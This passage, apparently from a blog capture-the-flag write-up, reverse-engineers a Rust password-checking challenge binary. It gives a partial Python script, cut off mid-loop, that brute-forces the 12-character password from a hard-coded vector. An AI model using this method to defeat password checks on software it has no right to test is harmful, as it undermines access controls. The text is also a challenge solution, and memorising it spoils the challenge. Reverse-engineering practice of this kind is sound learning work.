&lt;p&gt;&lt;img src=&quot;/./assets/imgs/rusty-target.png&quot; alt=&quot;target&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After that, we can see that some vector manipulation calls happen and finally a filter call to compare vectors.&lt;/p&gt;

&lt;p&gt;This behavior is repeated 3 times so let’s check the vector comparisons.&lt;/p&gt;

&lt;p&gt;When we take a look into the vector manipulation calls we can see that one of the components is one of the vectors that were previously built in the loop. The other one is a slice of the weird vector generated before of length 0xc.&lt;/p&gt;

&lt;p&gt;To pass the following filter call jump the two vectors must be the same. So now we know the length of the password is 12.&lt;/p&gt;

&lt;p&gt;If all filter checks are good, the password is printed out. If we try to go to the end bypassing the checks manually, the password printed is garbage.&lt;/p&gt;

&lt;p&gt;So let’s find out which password generates the 3 vectors that compose the weird huge vector.&lt;/p&gt;

&lt;h2 id=&quot;lets-crack-this-up&quot;&gt;Let’s crack this up.&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;When I solved this challenge I had 30 minutes left on the clock so I used the fastest and dirtiest solution.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The approach is the following. The results from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;y&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;z&lt;/code&gt; functions must match the weird vector.&lt;/p&gt;

&lt;p&gt;We can pick the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;z&lt;/code&gt; function and generate all possible values which match the results from the weird vector. From there, we can generate all the possible values in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;y&lt;/code&gt; function with the fixed ones from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;z&lt;/code&gt; function and check which ones are valid. Finally, do the same with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x&lt;/code&gt; function.&lt;/p&gt;

&lt;p&gt;This give us vectors with the [0], [1], [2], [3] and [5] positions. So we only need to do the calculations three times to get all pieces of the password and use the [5] value to check which is the valid next vector from all the possible ones.&lt;/p&gt;

&lt;p&gt;So the python code would be something like:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;weird&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x81&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x78&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x88&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xb5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x88&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xa9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x89&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x85&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x57&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x73&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x77&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x73&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x77&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x37&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x37&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x43&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x01&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xeb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x92&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xbc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;part_x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x81&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x78&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x88&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xb5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x88&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xa9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x89&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x85&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;part_y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x57&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x73&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x77&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x73&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x77&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x37&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x37&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x43&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;part_z&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x01&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xeb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x92&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xbc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;calc1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;result1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;calc2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;


&lt;span class=&quot;n&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;possibles&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[],[],[]]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;part_x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;total&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Generating possibles &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;127&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;127&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; 
            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;127&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;127&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;calc2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;part_z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;total&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;finals&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;total&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;127&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;calc1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;part_y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]):&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;finals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;


    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;finals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;if &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;part_x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
